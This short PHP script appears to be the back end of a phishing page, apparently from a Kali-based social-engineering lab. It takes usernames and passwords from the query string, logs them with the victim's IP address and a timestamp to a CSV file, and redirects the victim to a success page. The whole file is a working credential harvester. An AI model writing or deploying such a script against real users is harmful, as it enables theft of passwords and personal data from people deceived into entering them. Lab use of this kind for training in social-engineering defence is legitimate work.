<?php
if (isset($_GET['user'])) {
    $username = $_GET['user'];
    $password = $_GET['pass'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    $file = "/home/kali/social_lab/dataset.csv";

    if (!file_exists($file)) {
        file_put_contents($file, "time,ip,username,password\n");
    }

    $data = "$time,$ip,$username,$password\n";
    file_put_contents($file, $data, FILE_APPEND);
}

header("Location: success.html");
exit;
?>
